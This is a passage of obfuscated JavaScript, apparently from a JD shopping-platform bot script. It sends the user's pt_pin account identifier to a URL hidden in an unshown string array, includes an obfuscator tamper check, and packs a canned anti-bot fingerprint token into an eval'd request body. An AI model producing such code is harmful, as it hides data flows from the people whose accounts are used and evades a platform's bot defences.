setHelpStatus(_0x81e3x2){return  new Promise((_0x81e3x3)=>{$[__Oxdb1d3[0x4]]({url:`${__Oxdb1d3[0x0]}`,headers:{"\x70\x74\x5F\x70\x69\x6E":_0x81e3x2,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x81e3x4,_0x81e3x5,_0x81e3x6)=>{try{_0x81e3x6= JSON[__Oxdb1d3[0x1]](_0x81e3x6)}catch(e){$[__Oxdb1d3[0x3]](__Oxdb1d3[0x2],e,_0x81e3x5)}finally{_0x81e3x3(_0x81e3x6)}})})}(function(_0x81e3x7,_0x81e3x8,_0x81e3x9,_0x81e3xa,_0x81e3xb,_0x81e3xc){_0x81e3xc= __Oxdb1d3[0x5];_0x81e3xa= function(_0x81e3xd){if( typeof alert!== _0x81e3xc){alert(_0x81e3xd)};if( typeof console!== _0x81e3xc){console[__Oxdb1d3[0x6]](_0x81e3xd)}};_0x81e3x9= function(_0x81e3xe,_0x81e3x7){return _0x81e3xe+ _0x81e3x7};_0x81e3xb= _0x81e3x9(__Oxdb1d3[0x7],_0x81e3x9(_0x81e3x9(__Oxdb1d3[0x8],__Oxdb1d3[0x9]),__Oxdb1d3[0xa]));try{_0x81e3x7= __encode;if(!( typeof _0x81e3x7!== _0x81e3xc&& _0x81e3x7=== _0x81e3x9(__Oxdb1d3[0xb],__Oxdb1d3[0xc]))){_0x81e3xa(_0x81e3xb)}}catch(e){_0x81e3xa(_0x81e3xb)}})({})
//hb
eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-3]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('function hb(){return\'body=%7B%22random%0%2%2256828511%0%3%22log%0%2%221647133691611~1QLkKClp2omMDF2UmRnZjAyMQ%1%1.R2RQUFdFYVJQV0RmURkLRxZUC1U0Cw0JGEd%2BUktQWmMaVRhHLBMhCzs3EFBSDxZSFxcpMRYuLxc0VyQnCA%1%1.52dfd4d7~6%2C1~DBC3A45FC9AD7EDA8EEDDC2EC95388E32CCF6965~1vkdld9~C~ThtBVRAPbRRUAxQMCh4MfRp8fmNyeh5UGkISGRtRDh8MDhoJfhV5c2hyehpRGU0XFBBRABsJfRUMch55fWx3YhVUFEYXGhRUAxQMdx4Mfxp8fmN9Dx5UGkISaBUXTFxYFAxrF10AFQQHGnEIGXV5eQsAGlccQRsZGlYCGwACGX4NFH55d3UCGVgZTBAZFFIBGA8GFHUMGnp8dHwAFEcZQhRtGRtSSlwXDAQcF0pGGggXBwAEAgkMDwYHAAQCBQ0MCgAXGhRHUF0XAhBBQkJEQV9AXhAZFEFVVBsPGlRTQkJEQUxUGh4XRlJeFwNuDB4DDgMcDBUECB4EGgNtGRtfUhAPBRoSVkoXAhAMUlIGUQ9WAQQCBlVVV1oEWwtQBFBTBw4MDwsEDlRWDRsZGlxFFAwSXGldV1xQFBoSQRsPCQQBAQcDBg8MCQQEBxoSX1IXAhBXBVcJUVwFXFNQBlQDUFoNXgJXBQ9SB1oEC1EAAwEDDQlQDFFTD1QFFxUXXkJXFAwSQn9YdVdBAQJJcQ9FSW1WRH95VF8Ge3MXGhReQxsPGnNFRlpVFXpaVUJAQlNCGRl8VlEbFBoSW1hDGggXBwAHDAsHGh4XRVVCFwNuDwEDGgIBAWQZGkBaFAxrF1BlUF1bUwcAGQsXFBBceWUSGRsECxwDFBoSBAkbCxwHFBoSBA8CAQAHFBoSVwpUAVZQBlJRUAlXC1dWDlAAVwoMWgBWBwVTAAwCCwoFUwJTUwBXDRAZFFcSaBUXUV1UFAwSU19TXlRTQkISGRtUUhAPFEMSGRtWURAPFEEDGwsbDBAZFFVWak8XAhAFBBQcF1tRGggXRFdeUVZYBQcDDgQIAAgEGh4XW1wSD2ICFAMEGgJtGRtXVF1SFAwSBA8BDwIMAQICAQwECEwEcVJHc3ZGX31afHt0c1RjbQtfV3JxTXd0BQ8bYAR%2BAm9zUFdsfgdiYlVvU1d3Bnl%2BWHB5bXQNXXteVgxzUHAAeGMJdmpYaUpjZGxofkABcn50XWx6XG9kaHENbmNZZ3NsakV9fFxlXnpkS1t0TEFTeVNeUXtCd3V9dncDcktebHwCBVB7QVllZmJTXX10dQp%2BX2BRdH1WE3R0Y2J3fQ1%2FeUp0WHBJBVJ0e3t4e14ITHVtTwJiZ3tnegh7WXtMb315WW9Xc0UICxgCA1wFXVcBD0hHGQhLRkx3SGJyUWFtUGd6cAdhcn5kbWpydGRicGhBfXF3fHliUlF2fkUFYHBIUm9kQGtlcGd1dntSbWVyXnRhY0NeYHdZXnFmZHRtf0pjfnBXBW9zUFljbnNlY31NYXV9UXtyY1Vwa2Zeb3N1dAFjfmdSC0gAAQhZDgtDFBoSWEpSGggXFEs%1~1q344el%0%3%22sceneid%0%2%22JLHBhPageh5%0%7D\'}',[],4,'22|3D|3A|2C'.split('|'),0,{}));
